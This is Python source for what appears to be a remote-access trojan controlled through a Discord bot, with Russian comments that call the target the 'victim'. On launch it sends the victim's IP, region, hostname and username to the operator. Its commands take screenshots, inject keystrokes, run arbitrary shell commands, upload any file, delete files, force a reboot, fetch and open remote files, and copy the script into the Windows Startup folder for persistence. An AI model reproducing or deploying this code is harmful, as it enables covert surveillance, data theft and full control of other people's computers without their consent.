# Original by: KailUser
# Translate: kararasenok-gd

import pyautogui
import discord
from discord.ext import commands
import os
import sys
import platform
import webbrowser
import subprocess
import shutil
import urllib.request
import socket
import getpass
from asyncio import sleep as aiosleep
import requests
from bs4 import BeautifulSoup

intents = discord.Intents.all()
client = commands.Bot(command_prefix='>>>', intents=intents)
id = bot_channel




response = requests.get("https://2ip.ru")

soup = BeautifulSoup(response.content, "html.parser")

host_name = socket.gethostname()
ip_address = soup.find("div", {"class": "ip"}).text
region = soup.find("div", {"class": "value value-country"}).text
account_name = getpass.getuser()



@client.event
async def on_ready():
	channel = client.get_channel(id)
	if platform.system() == 'Windows':
		embed = discord.Embed(title=f'{client.user}', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Архетиктура: {platform.architecture()}\n \nIP-Адрес: {ip_address}\nРегион: {region}\nИмя ПК: {host_name}\nИмя Пользователя: {account_name}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg/1161px-Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg.png")
	elif platform.system() == 'Linux':
		embed = discord.Embed(title=f'{client.user}', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Архетиктура: {platform.architecture()}\n \nIP-Адрес: {ip_address}\nИмя ПК: {host_name}\nИмя Пользователя: {account_name}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/800px-Tux.svg.png")
	elif platform.system() == 'Macos':
		embed = discord.Embed(title=f'{client.user}', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Архетиктура: {platform.architecture()}\n \nIP-Адрес: {ip_address}\nИмя ПК: {host_name}\nИмя Пользователя: {account_name}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
	await channel.send(embed=embed)

@client.command(help="Сделать скриншот")
async def screenshot(ctx):
	screenshot = pyautogui.screenshot()
	screenshot.save('screenshot.png')
	with open('screenshot.png', 'rb') as f:
		file = discord.File(f, filename='screenshot.png')
		await ctx.send(file=file)
	os.remove('screenshot.png')

@client.command(help="Сделать поп-ап на ПК жертвы")
async def alert(ctx, *, message):
	pyautogui.alert(message)
	await ctx.send('Жертва закрыла поп-ап!')

@client.command(help="Написать и отправить сообщение")
async def write(ctx, *, message):
	await ctx.send("Пишу")
	pyautogui.write(message)
	pyautogui.press('enter')
	await ctx.send(f"Написал и отправил **{message}**")

@client.command(help="Скопировать текст")
async def copy_text(ctx):
	pyautogui.hotkey('ctrl', 'a')
	pyautogui.hotkey('ctrl', 'c')
	await ctx.send('Скопировал текст в клипборд Жертвы')

@client.command(help="Вставить текст")
async def paste_text(ctx):
	pyautogui.hotkey('ctrl', 'v')
	pyautogui.press('enter')

@client.command(help="Открыть веб страницу")
async def web(ctx, *, message):
	message_client = await ctx.send(f'Открываю https://{message}')
	webbrowser.open("https://" + message)
	await message_client.edit(f"Открыл https://{message}")

@client.command(help="Посмотреть информацию об устройстве")
async def device(ctx):
	if platform.system() == 'Windows':
		embed = discord.Embed(title=f'Устройство Жертвы', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Архетиктура: {platform.architecture()}\n \nIP-Адрес: {ip_address}\nИмя ПК: {host_name}\nИмя Пользователя: {account_name}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg/1161px-Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg.png")
	elif platform.system() == 'Linux':
		embed = discord.Embed(title=f'Устройство Жертвы', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Архетиктура: {platform.architecture()}\n \nIP-Адрес: {ip_address}\nИмя ПК: {host_name}\nИмя Пользователя: {account_name}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/800px-Tux.svg.png")
	elif platform.system() == 'Macos':
		embed = discord.Embed(title=f'Устройство Жертвы', description=f'ОС: {platform.system()} {platform.release()} \n Тип: {platform.machine()} \n Архетиктура: {platform.architecture()}\n \nIP-Адрес: {ip_address}\nИмя ПК: {host_name}\nИмя Пользователя: {account_name}', color=0x00ff6a)
		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
	await ctx.send(embed=embed)

@client.command(help="Отключиться (если уж надоело)")
async def disconnect(ctx):
	pyautogui.alert(text='Ты свободен... Разраб извеняется перед тобой если что)', title='ББ', button='ББ')
	await ctx.send('Я оффнулся')
	sys.exit(0)

@client.command(help="Выполнить что то в консоли")
async def console(ctx, *, command):

	with open("console.txt", "w") as f:
		result = subprocess.run(command, stdout=f, stderr=f, shell=True, text=True)

	with open('console.txt', 'rb') as f:
		file = discord.File(f, filename='console.txt')
		await ctx.send(file=file)
	os.remove('console.txt')

@client.command(help="Отправить файл")
async def file(ctx, *, path):
	with open(path, 'rb') as f:
		file = discord.File(f, filename=f'{path}')
		await ctx.send(file=file)

@client.command(help="Скопировать файл в Автозапуск")
async def autostart(ctx):
	roaming = os.getenv("appdata")
	dst = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

	shutil.copy2(sys.argv[0], dst)

	await ctx.send('Закинул скрипт в папку Авто Запуска')

@client.command(help="Перезагрузить ПК")
async def restart(ctx, *, answer = None):

	if answer is None:
		await ctx.send('Вы уверены что хотите перезагрузить компьютер Жертвы? Если вы не сделали авто-загрузку, то стоит её сделать командой **>>>autostart** | Если вы хотите перезагрузить ПК жертвы, то пропишите **>>>restart yes**')
	elif answer == 'yes':
		await ctx.send('ПК жертвы перезагрузится через 15 секунд')
		os.system('shutdown /t 15 /r')


@client.command(help="Удалить файл")
async def rmfile(ctx, *, path):
	os.remove(f'{path}')
	await ctx.send(f'Удалил файл по пути {path}')


@client.command(help="Проигрывает песню с Newgrounds (нужен айди и чтобы песню можно было скачать) или с другого источника")
async def play(ctx, arg = None, arg2 = None):
	if arg is None:
		await ctx.send('Укажите откуда брать музыку:\nС Newgrounds (ng)\nДругой источник (o)')
	elif arg == 'ng':
		if arg2 is None:
			await ctx.send('Укажите айди песни с Newgrounds')
		else:		
			await ctx.send(f'Песня: https://www.newgrounds.com/audio/listen/{arg2}')
			embed = discord.Embed(title = 'Проигрывание музыки - Шаг 1/3', description = f'Скачиваю [песню](https://www.newgrounds.com/audio/listen/{arg2}).... Это занимает от 15сек. до 1,5мин (всё зависит от интернет подключения жертвы). Пожалуйста подождите!', color = 0x0000ff)
			embed.set_footer(text='Если какой то шаг в течении 1-2 минут не переходит дальше, то возможно произошла ошибка')
			message = await ctx.send(embed = embed)
			try:
				urllib.request.urlretrieve(f"https://www.newgrounds.com/audio/download/{arg2}", f"{arg2}.mp3")
			except Exception as e:
				await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 1/3 - Ошибка', description = f'Я не могу скачать [песню](https://www.newgrounds.com/audio/listen/{arg2}) т.к она недоступна для скачивания или она не существует', color = 0xff0000))
				raise e

			await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3', description = 'Отправка файла....', color = 0x0000ff))

			with open(f'{arg2}.mp3', 'rb') as f:
				try:
					file = discord.File(f, filename=f'{arg2}.mp3')
					await ctx.send(file=file)
				except Exception:
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 10)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 9)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 8)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 7)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 6)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 5)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 4)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 3)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 2)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 1)', color = 0xff0000))
					await aiosleep(1)


			await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 3/3', description = 'Открытие файла на ПК жертвы и заверщение....', color = 0x0000ff))

			try:
				os.system(f'start {arg2}.mp3')
			except Exception as e:
				await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 3/3 - Ошибка', description = 'Произошла ошибка, возможно файла нету', color = 0xff0000))
				raise e

			await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Успешно!', description = 'Файл успешно запущен!'))
	elif arg == 'o':
		if arg2 is None:
			await ctx.send('Укажите, что проиграть')
		else:
			await ctx.send(f'Песня: {arg2}')
			embed = discord.Embed(title = 'Проигрывание музыки - Шаг 1/3', description = f'Скачиваю [песню]({arg2}).... Это занимает от 15сек. до 1,5мин (всё зависит от интернет подключения жертвы). Пожалуйста подождите!', color = 0x0000ff)
			embed.set_footer(text='Если какой то шаг в течении 1-2 минут не переходит дальше, то возможно произошла ошибка')
			message = await ctx.send(embed = embed)
			try:
				urllib.request.urlretrieve(f"{arg2}", f"song.mp3")
			except Exception as e:
				await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 1/3 - Ошибка', description = f'Я не могу скачать [песню]({arg2}) т.к она недоступна для скачивания или она не существует', color = 0xff0000))
				raise e

			await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3', description = 'Отправка файла....', color = 0x0000ff))

			with open(f'song.mp3', 'rb') as f:
				try:
					file = discord.File(f, filename=f'song.mp3')
					await ctx.send(file=file)
				except Exception:
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 10)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 9)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 8)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 7)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 6)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 5)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 4)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 3)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 2)', color = 0xff0000))
					await aiosleep(1)
					await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 2/3 - Ошибка', description = 'Произошла ошибка, возможно файл слишком большой (Размер файла не должен привышать 8 мб), файл не будет отправлен, но он будет открыт (команда продолжает своё выполнение через 1)', color = 0xff0000))
					await aiosleep(1)


			await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 3/3', description = 'Открытие файла на ПК жертвы и заверщение....', color = 0x0000ff))

			try:
				os.system(f'start song.mp3')
			except Exception as e:
				await message.edit(embed = discord.Embed(title = 'Проигрывание музыки - Шаг 3/3 - Ошибка', description = 'Произошла ошибка, возможно файла нету', color = 0xff0000))
				raise e








client.run('discord_bot_token')
